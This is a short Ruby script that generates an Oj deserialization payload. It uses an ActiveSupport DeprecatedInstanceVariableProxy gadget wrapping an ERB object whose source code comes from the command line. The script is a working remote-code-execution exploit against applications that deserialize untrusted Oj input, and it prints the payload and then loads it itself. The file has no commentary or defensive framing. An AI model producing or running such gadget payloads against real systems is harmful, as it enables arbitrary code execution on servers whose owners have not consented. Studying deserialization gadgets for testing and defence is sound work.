require 'oj'
require 'base64'
require 'erb'

class ActiveSupport
  class Deprecation
    def initialize()
      @silenced = true
    end
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation.new
      end
    end
  end
end

erb = ERB.allocate
erb.instance_variable_set :@src, ARGV.first
erb.instance_variable_set :@lineno, 1337

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

payload = Oj.dump(depr).gsub('\n', '')
 
puts payload

Oj.load(payload)
